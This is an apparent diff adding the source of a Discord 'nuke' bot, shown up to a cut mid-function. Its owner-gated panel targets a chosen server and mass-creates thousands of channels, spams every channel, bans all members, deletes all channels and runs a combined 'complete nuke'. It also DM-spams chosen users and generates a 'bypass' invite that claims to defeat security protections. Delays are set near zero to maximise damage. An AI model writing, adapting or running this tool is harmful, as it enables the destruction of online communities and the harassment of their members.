@@ -1,0 +1,1825 @@
+import discord
+from discord.ext import commands
+from discord import app_commands
+import asyncio
+import random
+import json
+import os
+from colorama import init, Fore
+
+init(autoreset=True)
+
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="!", intents=intents)
+
+user_sessions = {}
+
+# ============ CONFIG ============ #
+OWNER_ID = 1515371958332686480
+AUTHORIZED_USERS_FILE = "authorized_users.json"
+BYPASS_USERS_FILE = "bypass_users.json"
+ADMIN_USERS_FILE = "admin_users.json"
+TOKEN_FILE = "config.txt"
+
+# ============ SPEED CONFIG ============ #
+CHANNEL_CREATE_DELAY = 0.001
+MESSAGE_SEND_DELAY = 0.0001
+ROLE_CREATE_DELAY = 0.005
+BAN_DELAY = 0.0001
+KICK_DELAY = 0.0001
+
+# ============ TOKEN MANAGEMENT ============ #
+def load_token():
+    try:
+        with open(TOKEN_FILE, "r") as f:
+            for line in f:
+                if line.startswith("TOKEN="):
+                    return line.split("=", 1)[1].strip()
+    except FileNotFoundError:
+        print("❌ config.txt not found!")
+        return None
+
+# ============ ADMIN SYSTEM ============ #
+def load_admin_users():
+    """Load admin users from JSON file"""
+    if os.path.exists(ADMIN_USERS_FILE):
+        try:
+            with open(ADMIN_USERS_FILE, "r") as f:
+                return json.load(f)
+        except:
+            return []
+    return []
+
+def save_admin_users(users):
+    """Save admin users to JSON file"""
+    with open(ADMIN_USERS_FILE, "w") as f:
+        json.dump(users, f, indent=2)
+
+def add_admin_user(user_id):
+    """Add a user to admin list"""
+    users = load_admin_users()
+    if user_id not in users:
+        users.append(user_id)
+        save_admin_users(users)
+        print(f"✅ User {user_id} added to admin users")
+    return user_id in users
+
+def is_admin(user_id):
+    """Check if user is admin or owner"""
+    users = load_admin_users()
+    return user_id in users or user_id == OWNER_ID
+
+def remove_admin_user(user_id):
+    """Remove a user from admin list"""
+    users = load_admin_users()
+    if user_id in users:
+        users.remove(user_id)
+        save_admin_users(users)
+        print(f"✅ User {user_id} removed from admin users")
+    return user_id not in users
+
+# ============ AUTHORIZED USERS SYSTEM ============ #
+def load_authorized_users():
+    """Load authorized users from JSON file"""
+    if os.path.exists(AUTHORIZED_USERS_FILE):
+        try:
+            with open(AUTHORIZED_USERS_FILE, "r") as f:
+                return json.load(f)
+        except:
+            return []
+    return []
+
+def save_authorized_users(users):
+    """Save authorized users to JSON file"""
+    with open(AUTHORIZED_USERS_FILE, "w") as f:
+        json.dump(users, f, indent=2)
+
+def add_authorized_user(user_id):
+    """Add a user to authorized list"""
+    users = load_authorized_users()
+    if user_id not in users:
+        users.append(user_id)
+        save_authorized_users(users)
+        print(f"✅ User {user_id} added to authorized users")
+    return user_id in users
+
+def is_authorized(user_id):
+    """Check if user is authorized for panel/spam commands"""
+    return is_admin(user_id)
+
+def remove_authorized_user(user_id):
+    """Remove a user from authorized list"""
+    users = load_authorized_users()
+    if user_id in users:
+        users.remove(user_id)
+        save_authorized_users(users)
+        print(f"✅ User {user_id} removed from authorized users")
+    return user_id not in users
+
+# ============ BYPASS USERS SYSTEM ============ #
+def load_bypass_users():
+    """Load bypass users from JSON file"""
+    if os.path.exists(BYPASS_USERS_FILE):
+        try:
+            with open(BYPASS_USERS_FILE, "r") as f:
+                return json.load(f)
+        except:
+            return []
+    return []
+
+def save_bypass_users(users):
+    """Save bypass users to JSON file"""
+    with open(BYPASS_USERS_FILE, "w") as f:
+        json.dump(users, f, indent=2)
+
+def add_bypass_user(user_id):
+    """Add a user to bypass list"""
+    users = load_bypass_users()
+    if user_id not in users:
+        users.append(user_id)
+        save_bypass_users(users)
+        print(f"✅ User {user_id} added to bypass users")
+    return user_id in users
+
+def is_bypass_authorized(user_id):
+    """Check if user is authorized for bypass command"""
+    users = load_bypass_users()
+    return user_id in users or user_id == OWNER_ID
+
+def remove_bypass_user(user_id):
+    """Remove a user from bypass list"""
+    users = load_bypass_users()
+    if user_id in users:
+        users.remove(user_id)
+        save_bypass_users(users)
+        print(f"✅ User {user_id} removed from bypass users")
+    return user_id not in users
+
+# ============ BYPASS CLIENT ID MODAL ============ #
+class BypassClientIDModal(discord.ui.Modal, title="🔐 Bypass Bot"):
+    client_id = discord.ui.TextInput(
+        label="Target Bot Client ID",
+        placeholder="e.g., 1234567890",
+        required=True,
+        min_length=1,
+        max_length=20
+    )
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+
+        if not is_bypass_authorized(interaction.user.id):
+            embed = discord.Embed(
+                title="❌ UNAUTHORIZED",
+                description=f"You are not authorized to use bypass!\n**Your ID:** `{interaction.user.id}`",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+            return
+
+        try:
+            bot_client_id = int(self.client_id.value.strip())
+            
+            # Bypass Invite Link - No permissions required
+            bypass_invite_url = f"https://discord.com/oauth2/authorize?client_id={bot_client_id}&scope=bot&permissions=0"
+            
+            embed = discord.Embed(
+                title="✅ BYPASS INVITE GENERATED",
+                description=f"**Bot Client ID:** `{bot_client_id}`\n\n**Bypass Link:** [Click Here]({bypass_invite_url})",
+                color=discord.Color.green()
+            )
+            embed.add_field(
+                name="📌 HOW IT WORKS",
+                value="• Bot joins with **NO PERMISSIONS**\n• Bot's admin role will be **DISABLED** automatically\n• Security protection **BYPASSED**\n• Bot cannot modify server settings",
+                inline=False
+            )
+            embed.set_footer(text="Only you can see this")
+
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+        except ValueError:
+            embed = discord.Embed(
+                title="❌ ERROR",
+                description="Invalid Bot Client ID! Please check your input.",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+# ============ BYPASS BUTTON VIEW ============ #
+class BypassButtonView(discord.ui.View):
+    def __init__(self, user_id):
+        super().__init__()
+        self.user_id = user_id
+
+    async def interaction_check(self, interaction: discord.Interaction) -> bool:
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message("❌ Only you can see this", ephemeral=True)
+            return False
+        return True
+
+    @discord.ui.button(label="🔐 TARGET BOT CLIENT ID", style=discord.ButtonStyle.danger)
+    async def bypass_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        modal = BypassClientIDModal()
+        await interaction.response.send_modal(modal)
+
+# ============ SPAM BUTTON VIEW ============ #
+class SpamButton(discord.ui.View):
+    def __init__(self, message, delay=0):
+        super().__init__(timeout=60)
+        self.message = message
+        self.delay = delay
+
+    @discord.ui.button(label="🟢 Spam x1", style=discord.ButtonStyle.success)
+    async def spam_1x(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(ephemeral=True)
+        for i in range(1):
+            await interaction.followup.send(self.message)
+            if self.delay > 0:
+                await asyncio.sleep(self.delay)
+
+        embed = discord.Embed(
+            title="✅ 1X Spam Complete!",
+            description=f"Message: `{self.message}`\nDelay: {self.delay}s",
+            color=discord.Color.green()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.followup.send(embed=embed, ephemeral=True)
+
+    @discord.ui.button(label="🔵 Spam x10", style=discord.ButtonStyle.primary)
+    async def spam_10x(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(ephemeral=True)
+        for i in range(10):
+            await interaction.followup.send(self.message)
+            if self.delay > 0:
+                await asyncio.sleep(self.delay)
+
+        embed = discord.Embed(
+            title="✅ 10X Spam Complete!",
+            description=f"Message: `{self.message}`\nDelay: {self.delay}s",
+            color=discord.Color.blue()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.followup.send(embed=embed, ephemeral=True)
+
+    @discord.ui.button(label="🔴 Spam x16", style=discord.ButtonStyle.danger)
+    async def spam_16x(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(ephemeral=True)
+        for i in range(16):
+            await interaction.followup.send(self.message)
+            if self.delay > 0:
+                await asyncio.sleep(self.delay)
+
+        embed = discord.Embed(
+            title="✅ 16X Spam Complete!",
+            description=f"Message: `{self.message}`\nDelay: {self.delay}s",
+            color=discord.Color.red()
+        )
+        embed.set_footer(text="Only you can see this")
+        await interaction.followup.send(embed=embed, ephemeral=True)
+
+# ============ DM SPAM COUNT BUTTON VIEW ============ #
+class DMSpamCountButton(discord.ui.View):
+    def __init__(self, user_id, message, target_user):
+        super().__init__(timeout=60)
+        self.user_id = user_id
+        self.message = message
+        self.target_user = target_user
+
+    @discord.ui.button(label="🟢 Spam x1", style=discord.ButtonStyle.success)
+    async def dm_spam_1x(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(ephemeral=True)
+        try:
+            for i in range(1):
+                await self.target_user.send(self.message)
+
+            embed = discord.Embed(
+                title="✅ 1X Spam Sent",
+                description=f"Message sent to {self.target_user.mention}",
+                color=discord.Color.green()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+        except Exception as e:
+            embed = discord.Embed(
+                title="❌ Error",
+                description=f"{str(e)}",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+    @discord.ui.button(label="🔵 Spam x10", style=discord.ButtonStyle.primary)
+    async def dm_spam_10x(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(ephemeral=True)
+        try:
+            for i in range(10):
+                await self.target_user.send(self.message)
+
+            embed = discord.Embed(
+                title="✅ 10X Spam Sent",
+                description=f"Messages sent to {self.target_user.mention}",
+                color=discord.Color.blue()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+        except Exception as e:
+            embed = discord.Embed(
+                title="❌ Error",
+                description=f"{str(e)}",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+    @discord.ui.button(label="🔴 Spam x16", style=discord.ButtonStyle.danger)
+    async def dm_spam_16x(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(ephemeral=True)
+        try:
+            for i in range(16):
+                await self.target_user.send(self.message)
+
+            embed = discord.Embed(
+                title="✅ 16X Spam Sent",
+                description=f"Messages sent to {self.target_user.mention}",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+        except Exception as e:
+            embed = discord.Embed(
+                title="❌ Error",
+                description=f"{str(e)}",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+# ============ DM SPAM USER MODAL ============ #
+class DMSpamUserModal(discord.ui.Modal, title="💌 DM Spam User"):
+    user_id = discord.ui.TextInput(
+        label="Target User ID",
+        placeholder="e.g., 123456789",
+        required=True,
+        min_length=1,
+        max_length=20
+    )
+
+    message = discord.ui.TextInput(
+        label="Spam Content",
+        placeholder="Enter your message here...",
+        required=True,
+        min_length=1,
+        max_length=2000
+    )
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+
+        if not is_authorized(interaction.user.id):
+            embed = discord.Embed(
+                title="❌ UNAUTHORIZED",
+                description=f"You are not authorized to use this bot!\n**Your ID:** `{interaction.user.id}`",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+            return
+
+        try:
+            user_id = int(self.user_id.value.strip())
+            message_text = self.message.value.strip()
+
+            user = await bot.fetch_user(user_id)
+            view = DMSpamCountButton(interaction.user.id, message_text, user)
+
+            embed = discord.Embed(
+                title="💌 DM SPAM",
+                description=f"**Target:** {user.mention}\n**Message:** `{message_text}`",
+                color=discord.Color.red()
+            )
+            embed.add_field(name="📊 SELECT SPAM COUNT", value="Choose how many times to spam", inline=False)
+            embed.set_footer(text="Only you can see this")
+
+            await interaction.followup.send(embed=embed, view=view, ephemeral=True)
+
+        except ValueError:
+            embed = discord.Embed(
+                title="❌ ERROR",
+                description="Invalid User ID! Please check your input.",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+        except discord.NotFound:
+            embed = discord.Embed(
+                title="❌ ERROR",
+                description=f"User with ID `{self.user_id.value}` not found!",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+        except Exception as e:
+            embed = discord.Embed(
+                title="❌ ERROR",
+                description=f"{str(e)}",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+# ============ EMBED SPAM BUTTON VIEW ============ #
+class SpamEmbedButton(discord.ui.View):
+    def __init__(self, embed, link, delay=0):
+        super().__init__(timeout=60)
+        self.embed = embed
+        self.link = link
+        self.delay = delay
+
+    @discord.ui.button(label="🔴 SPAM NOW (16X)", style=discord.ButtonStyle.danger)
+    async def spam_embed(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(ephemeral=True)
+
+        for i in range(16):
+            embed_copy = self.embed.copy()
+            embed_copy.description = f"{self.embed.description}\n\n🔗 **Link:** {self.link}"
+            await interaction.followup.send(embed=embed_copy)
+            if self.delay > 0:
+                await asyncio.sleep(self.delay)
+
+        embed_response = discord.Embed(
+            title="✅ 16X Embed Spam Complete!",
+            description="Your spam has been sent successfully",
+            color=discord.Color.red()
+        )
+        embed_response.set_footer(text="Only you can see this")
+        await interaction.followup.send(embed=embed_response, ephemeral=True)
+
+# ============ SELECT GUILD BUTTON ============ #
+class SelectGuildButton(discord.ui.View):
+    def __init__(self, user_id):
+        super().__init__()
+        self.user_id = user_id
+
+        invite_url = "https://discord.com/oauth2/authorize?client_id=1515778808643588276&permissions=8&scope=bot"
+        self.add_item(discord.ui.Button(label="🤖 INVITE BOT (PREMIUM)", style=discord.ButtonStyle.link, url=invite_url))
+
+    async def interaction_check(self, interaction: discord.Interaction) -> bool:
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message("❌ Only you can see this", ephemeral=True)
+            return False
+        return True
+
+    @discord.ui.button(label="📌 SUBMIT TARGET GUILD ID", style=discord.ButtonStyle.blurple)
+    async def select_guild(self, interaction: discord.Interaction, button: discord.ui.Button):
+        modal = GuildIDModal(self.user_id, bot)
+        await interaction.response.send_modal(modal)
+
+# ============ GUILD ID MODAL ============ #
+class GuildIDModal(discord.ui.Modal):
+    def __init__(self, user_id, bot_instance):
+        super().__init__(title="Select Server")
+        self.user_id = user_id
+        self.bot = bot_instance
+
+        self.guild_id = discord.ui.TextInput(
+            label="Guild ID",
+            placeholder="Enter your server's Guild ID",
+            required=True,
+            min_length=1,
+            max_length=20
+        )
+        self.add_item(self.guild_id)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+
+        try:
+            guild_id = int(self.guild_id.value.strip())
+            guild = self.bot.get_guild(guild_id)
+
+            if not guild:
+                embed = discord.Embed(
+                    title="❌ ERROR",
+                    description="Guild Not Found!\n\nMake sure the bot is in this server",
+                    color=discord.Color.red()
+                )
+                await interaction.followup.send(embed=embed, ephemeral=True)
+                return
+
+            print(f"✅ Guild Detected: {guild.name} ({guild_id})")
+            await interaction.followup.send("🔍 **Detecting Server...**", ephemeral=True)
+            await asyncio.sleep(0.1)
+
+            embed = discord.Embed(
+                title=f"✅ {guild.name}",
+                description=f"**Members:** {guild.member_count}\n**ID:** `{guild.id}`\n**Owner:** {guild.owner.mention if guild.owner else 'Unknown'}\n**Channels:** {len(guild.channels)}\n**Roles:** {len(guild.roles)}",
+                color=discord.Color.red()
+            )
+            embed.set_thumbnail(url=guild.icon.url if guild.icon else "")
+            embed.set_footer(text="Ready for operations • MAX SPEED • PREMIUM")
+
+            view = NukeOptionsView(self.user_id, guild_id, self.bot)
+            user = await self.bot.fetch_user(self.user_id)
+            await user.send(embed=embed, view=view)
+
+        except ValueError:
+            embed = discord.Embed(
+                title="❌ ERROR",
+                description="Invalid Guild ID! (Numbers only)",
+                color=discord.Color.red()
+            )
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+# ============ CHANNEL NAME MODAL (NEW - 3 FIELDS) ============ #
+class ChannelNameModal(discord.ui.Modal):
+    def __init__(self, guild_id, user_id, bot_instance):
+        super().__init__(title="⚡ Create Channels (PREMIUM)")
+        self.guild_id = guild_id
+        self.user_id = user_id
+        self.bot = bot_instance
+
+        self.channel_count = discord.ui.TextInput(
+            label="Channel Count",
+            placeholder="How many channels? (e.g., 5000)",
+            required=True,
+            min_length=1,
+            max_length=10
+        )
+        self.add_item(self.channel_count)
+
+        self.channel_name = discord.ui.TextInput(
+            label="Channel Name",
+            placeholder="Enter channel name prefix",
+            required=True,
+            min_length=1,
+            max_length=80
+        )
+        self.add_item(self.channel_name)
+
+        self.channel_type = discord.ui.TextInput(
+            label="Channel Type (T=Text, V=Voice)",
+            placeholder="Enter T for Text or V for Voice",
+            required=True,
+            min_length=1,
+            max_length=1
+        )
+        self.add_item(self.channel_type)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+        
+        try:
+            channel_count = int(self.channel_count.value.strip())
+            channel_name = self.channel_name.value.strip()
+            channel_type = self.channel_type.value.strip().upper()
+
+            if channel_type not in ["T", "V"]:
+                embed = discord.Embed(
+                    title="❌ ERROR",
+                    description="Channel Type must be T (Text) or V (Voice)",
+                    color=discord.Color.red()
+                )
+                embed.set_footer(text="Only you can see this")
+                await interaction.followup.send(embed=embed, ephemeral=True)
+                return
+
+            if channel_count <= 0 or channel_count > 10000:
+                embed = discord.Embed(
+                    title="❌ ERROR",
+                    description="Channel count must be between 1 and 10000",
+                    color=discord.Color.red()
+                )
+                embed.set_footer(text="Only you can see this")
+                await interaction.followup.send(embed=embed, ephemeral=True)
+                return
+
+            guild = self.bot.get_guild(self.guild_id)
+
+            if guild:
+                await interaction.followup.send("✅ Processing...", ephemeral=True)
+                await create_channels_custom(guild, channel_name, channel_type, channel_count, self.user_id)
+            else:
+                embed = discord.Embed(
+                    title="❌ ERROR",
+                    description="Server not found!",
+                    color=discord.Color.red()
+                )
+                embed.set_footer(text="Only you can see this")
+                await interaction.followup.send(embed=embed, ephemeral=True)
+
+        except ValueError:
+            embed = discord.Embed(
+                title="❌ ERROR",
+                description="Invalid input! Channel count must be a number",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+# ============ SPAM MESSAGE MODAL ============ #
+class SpamMessageModal(discord.ui.Modal):
+    def __init__(self, guild_id, user_id, bot_instance):
+        super().__init__(title="Spam Messages")
+        self.guild_id = guild_id
+        self.user_id = user_id
+        self.bot = bot_instance
+
+        self.spam_text = discord.ui.TextInput(
+            label="Message to Spam",
+            placeholder="Enter the message (5000 will be sent)",
+            required=True,
+            min_length=1,
+            max_length=2000
+        )
+        self.add_item(self.spam_text)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+        spam_text = self.spam_text.value
+        guild = self.bot.get_guild(self.guild_id)
+
+        if guild:
+            await interaction.followup.send("✅ Processing...", ephemeral=True)
+            await spam_all_channels(guild, spam_text, self.user_id)
+        else:
+            embed = discord.Embed(
+                title="❌ ERROR",
+                description="Server not found!",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+# ============ ROLE NAME MODAL ============ #
+class RoleNameModal(discord.ui.Modal):
+    def __init__(self, guild_id, user_id, bot_instance):
+        super().__init__(title="Create Roles")
+        self.guild_id = guild_id
+        self.user_id = user_id
+        self.bot = bot_instance
+
+        self.role_name = discord.ui.TextInput(
+            label="Role Name",
+            placeholder="Enter role name (200 will be created)",
+            required=True,
+            min_length=1,
+            max_length=100
+        )
+        self.add_item(self.role_name)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+        role_name = self.role_name.value
+        guild = self.bot.get_guild(self.guild_id)
+
+        if guild:
+            await interaction.followup.send("✅ Processing...", ephemeral=True)
+            await create_200_roles(guild, role_name, self.user_id)
+        else:
+            embed = discord.Embed(
+                title="❌ ERROR",
+                description="Server not found!",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+# ============ COMPLETE NUKE MODAL ============ #
+class CompleteNukeModal(discord.ui.Modal):
+    def __init__(self, guild_id, user_id, bot_instance):
+        super().__init__(title="💥 Complete Nuke (PREMIUM)")
+        self.guild_id = guild_id
+        self.user_id = user_id
+        self.bot = bot_instance
+
+        self.channel_count = discord.ui.TextInput(
+            label="Channel Count",
+            placeholder="How many channels? (e.g., 5000)",
+            required=True,
+            min_length=1,
+            max_length=10
+        )
+        self.add_item(self.channel_count)
+
+        self.channel_name = discord.ui.TextInput(
+            label="Channel Name",
+            placeholder="Enter channel name prefix",
+            required=True,
+            min_length=1,
+            max_length=80
+        )
+        self.add_item(self.channel_name)
+
+        self.spam_content = discord.ui.TextInput(
+            label="Spam Content",
+            placeholder="Enter message to spam (5 per channel)",
+            required=True,
+            min_length=1,
+            max_length=2000
+        )
+        self.add_item(self.spam_content)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+        
+        try:
+            channel_count = int(self.channel_count.value.strip())
+            channel_name = self.channel_name.value.strip()
+            spam_content = self.spam_content.value.strip()
+            
+            if channel_count <= 0 or channel_count > 10000:
+                embed = discord.Embed(
+                    title="❌ ERROR",
+                    description="Channel count must be between 1 and 10000",
+                    color=discord.Color.red()
+                )
+                embed.set_footer(text="Only you can see this")
+                await interaction.followup.send(embed=embed, ephemeral=True)
+                return
+
+            guild = self.bot.get_guild(self.guild_id)
+
+            if guild:
+                await interaction.followup.send("✅ Starting MAXIMUM SPEED Nuke...", ephemeral=True)
+
+                # Concurrent channel create and spam
+                await create_and_spam_channels_nuke(guild, channel_name, spam_content, channel_count, self.user_id)
+
+                # Then ban
+                await ban_all_members_auto(guild, self.user_id)
+
+                await asyncio.sleep(0.1)
+                await delete_nuke_messages(self.user_id)
+            else:
+                embed = discord.Embed(
+                    title="❌ ERROR",
+                    description="Server not found!",
+                    color=discord.Color.red()
+                )
+                embed.set_footer(text="Only you can see this")
+                await interaction.followup.send(embed=embed, ephemeral=True)
+        
+        except ValueError:
+            embed = discord.Embed(
+                title="❌ ERROR",
+                description="Invalid input! Channel count must be a number",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+# ============ NUKE OPTIONS VIEW ============ #
+class NukeOptionsView(discord.ui.View):
+    def __init__(self, user_id, guild_id, bot_instance):
+        super().__init__()
+        self.user_id = user_id
+        self.guild_id = guild_id
+        self.bot = bot_instance
+
+    async def interaction_check(self, interaction: discord.Interaction) -> bool:
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message("❌ Only you can see this", ephemeral=True)
+            return False
+        return True
+
+    @discord.ui.button(label="📝 CREATE CHANNELS", style=discord.ButtonStyle.primary)
+    async def create_channels(self, interaction: discord.Interaction, button: discord.ui.Button):
+        modal = ChannelNameModal(self.guild_id, self.user_id, self.bot)
+        await interaction.response.send_modal(modal)
+
+    @discord.ui.button(label="📢 SPAM MESSAGES", style=discord.ButtonStyle.danger)
+    async def spam_messages(self, interaction: discord.Interaction, button: discord.ui.Button):
+        modal = SpamMessageModal(self.guild_id, self.user_id, self.bot)
+        await interaction.response.send_modal(modal)
+
+    @discord.ui.button(label="🚫 BAN ALL MEMBERS", style=discord.ButtonStyle.red)
+    async def ban_members(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(ephemeral=True)
+        guild = self.bot.get_guild(self.guild_id)
+        if guild:
+            await ban_all_members(guild, interaction, self.user_id)
+        else:
+            embed = discord.Embed(
+                title="❌ ERROR",
+                description="Guild Not Found!",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+    @discord.ui.button(label="👤 CREATE ROLES", style=discord.ButtonStyle.secondary)
+    async def create_roles(self, interaction: discord.Interaction, button: discord.ui.Button):
+        modal = RoleNameModal(self.guild_id, self.user_id, self.bot)
+        await interaction.response.send_modal(modal)
+
+    @discord.ui.button(label="🔄 DELETE ALL CHANNELS", style=discord.ButtonStyle.danger)
+    async def delete_channels(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(ephemeral=True)
+        guild = self.bot.get_guild(self.guild_id)
+        if guild:
+            await delete_all_channels(guild, interaction, self.user_id)
+        else:
+            embed = discord.Embed(
+                title="❌ ERROR",
+                description="Guild Not Found!",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+    @discord.ui.button(label="💥 COMPLETE NUKE", style=discord.ButtonStyle.danger)
+    async def complete_nuke(self, interaction: discord.Interaction, button: discord.ui.Button):
+        modal = CompleteNukeModal(self.guild_id, self.user_id, self.bot)
+        await interaction.response.send_modal(modal)
+
+# ============ ADD AUTH MODAL ============ #
+class AddAuthModal(discord.ui.Modal):
+    def __init__(self):
+        super().__init__(title="Add Authorized User")
+
+        self.user_id = discord.ui.TextInput(
+            label="User ID",
+            placeholder="Enter the user ID to authorize",
+            required=True,
+            min_length=1,
+            max_length=20
+        )
+        self.add_item(self.user_id)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+
+        if interaction.user.id != OWNER_ID:
+            embed = discord.Embed(
+                title="❌ OWNER ONLY",
+                description=f"Only the bot owner can use this command!\nYour ID: `{interaction.user.id}`\nOwner ID: `{OWNER_ID}`",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+            return
+
+        try:
+            user_id = int(self.user_id.value.strip())
+
+            if add_authorized_user(user_id):
+                embed = discord.Embed(
+                    title="✅ USER AUTHORIZED",
+                    description=f"User `{user_id}` has been authorized to use panel/spam commands!",
+                    color=discord.Color.green()
+                )
+            else:
+                embed = discord.Embed(
+                    title="ℹ️ ALREADY AUTHORIZED",
+                    description=f"User `{user_id}` is already authorized!",
+                    color=discord.Color.blue()
+                )
+
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+        except ValueError:
+            embed = discord.Embed(
+                title="❌ ERROR",
+                description="Invalid User ID! (Numbers only)",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+# ============ REMOVE AUTH MODAL ============ #
+class RemoveAuthModal(discord.ui.Modal):
+    def __init__(self):
+        super().__init__(title="Remove Authorized User")
+
+        self.user_id = discord.ui.TextInput(
+            label="User ID",
+            placeholder="Enter the user ID to remove",
+            required=True,
+            min_length=1,
+            max_length=20
+        )
+        self.add_item(self.user_id)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+
+        if interaction.user.id != OWNER_ID:
+            embed = discord.Embed(
+                title="❌ OWNER ONLY",
+                description=f"Only the bot owner can use this command!\nYour ID: `{interaction.user.id}`\nOwner ID: `{OWNER_ID}`",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+            return
+
+        try:
+            user_id = int(self.user_id.value.strip())
+
+            if remove_authorized_user(user_id):
+                embed = discord.Embed(
+                    title="✅ USER REMOVED",
+                    description=f"User `{user_id}` has been removed from authorization!",
+                    color=discord.Color.green()
+                )
+            else:
+                embed = discord.Embed(
+                    title="ℹ️ NOT FOUND",
+                    description=f"User `{user_id}` was not in the authorized list!",
+                    color=discord.Color.blue()
+                )
+
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+        except ValueError:
+            embed = discord.Embed(
+                title="❌ ERROR",
+                description="Invalid User ID! (Numbers only)",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+# ============ ADD BYPASS MODAL ============ #
+class AddBypassModal(discord.ui.Modal):
+    def __init__(self):
+        super().__init__(title="Add Bypass User")
+
+        self.user_id = discord.ui.TextInput(
+            label="User ID",
+            placeholder="Enter the user ID for bypass access",
+            required=True,
+            min_length=1,
+            max_length=20
+        )
+        self.add_item(self.user_id)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+
+        if interaction.user.id != OWNER_ID:
+            embed = discord.Embed(
+                title="❌ OWNER ONLY",
+                description=f"Only the bot owner can use this command!\nYour ID: `{interaction.user.id}`\nOwner ID: `{OWNER_ID}`",
+                color=discord.Color.red()
+            )
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+            return
+
+        try:
+            user_id = int(self.user_id.value.strip())
+
+            if add_bypass_user(user_id):
+                embed = discord.Embed(
+                    title="✅ BYPASS USER ADDED",
+                    description=f"User `{user_id}` has been authorized to use /bypass command!",
+                    color=discord.Color.green()
+                )
+            else:
+                embed = discord.Embed(
+                    title="ℹ️ ALREADY HAS BYPASS",
+                    description=f"User `{user_id}` already has bypass access!",
+                    color=discord.Color.blue()
+                )
+
+            embed.set_footer(text="Only you can see this")
+            await interaction.followup.send(embed=embed, ephemeral=True)
+
+        except ValueError:
+            embed = discord.Embed(
+                title="❌ ERROR",
